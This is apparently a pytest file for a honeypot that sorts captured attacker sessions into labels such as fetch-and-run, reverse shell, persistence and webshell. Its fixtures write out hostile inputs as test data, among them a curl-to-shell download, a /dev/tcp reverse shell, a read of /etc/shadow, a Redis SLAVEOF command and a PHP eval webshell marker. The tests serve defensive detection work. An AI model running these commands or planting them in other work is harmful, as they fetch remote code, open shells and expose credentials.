from __future__ import annotations

from honeybot.reconstruct import is_fetch, normalize, reconstruct


def _bundle(commands: list[str], paths: list[str] | None = None, auths: int = 0) -> dict:
    return {
        "commands": [{"id": index + 1, "raw": raw} for index, raw in enumerate(commands)],
        "http": [{"id": index + 1, "path": path} for index, path in enumerate(paths or [])],
        "auths": [{"username": "root"}] * auths,
    }


def test_structural_labels():
    assert reconstruct(_bundle([])).primary == "banner_grab"
    assert reconstruct(_bundle([], auths=2)).primary == "auth_guess"


def test_command_labels():
    assert reconstruct(_bundle(["uname -a"])).primary == "recon_host"
    assert reconstruct(_bundle(["id"])).primary == "recon_host"
    fetched = reconstruct(_bundle(["curl http://203.0.113.5/a | sh"]))
    assert fetched.primary == "fetch_and_run"
    assert "не исполнялась" in fetched.summary
    assert reconstruct(_bundle(["uname -a", "curl http://x/a | sh"])).primary == "fetch_and_run"
    assert reconstruct(_bundle(["curl http://x/a.sh", "sh a.sh"])).primary == "fetch_and_run"
    assert reconstruct(_bundle(["SLAVEOF 10.1.2.3 6379"])).primary == "abuse_verb"
    assert reconstruct(_bundle(["crontab -l"])).primary == "persistence"
    assert reconstruct(_bundle(["busybox wget http://203.0.113.5/a"])).primary == "busybox"
    shell = reconstruct(_bundle(["bash -i >& /dev/tcp/203.0.113.5/4444"]))
    assert shell.primary == "reverse_shell"
    assert "наружу не открывалось" in shell.summary
    assert reconstruct(_bundle(["cat /etc/shadow"])).primary == "recon_host"
    assert is_fetch("echo aGVsbG8= | base64 -d | sh") or is_fetch("base64 -d | sh")


def test_http_labels_and_normalize():
    assert reconstruct(_bundle([], ["/.env"])).primary == "web_secret_probe"
    assert reconstruct(_bundle([], ["/wp-login.php"])).primary == "web_login_probe"
    assert reconstruct(_bundle([], ["/.environment"])).primary == "unclassified"
    assert reconstruct(_bundle([], ["/uploads/shell.php"])).primary == "webshell"
    marker = "<" + "?php eval($_" + "POST['c']);"
    uploaded = reconstruct(
        {
            "commands": [],
            "http": [
                {
                    "id": 1,
                    "path": "/upload",
                    "query": "",
                    "body_snippet": marker,
                }
            ],
            "auths": [],
        }
    )
    assert uploaded.primary == "webshell"
    assert normalize("curl http://203.0.113.5/a.sh") == "curl <url>"
    assert normalize("SLAVEOF 203.0.113.5 6379") == "slaveof <ip> 6379"
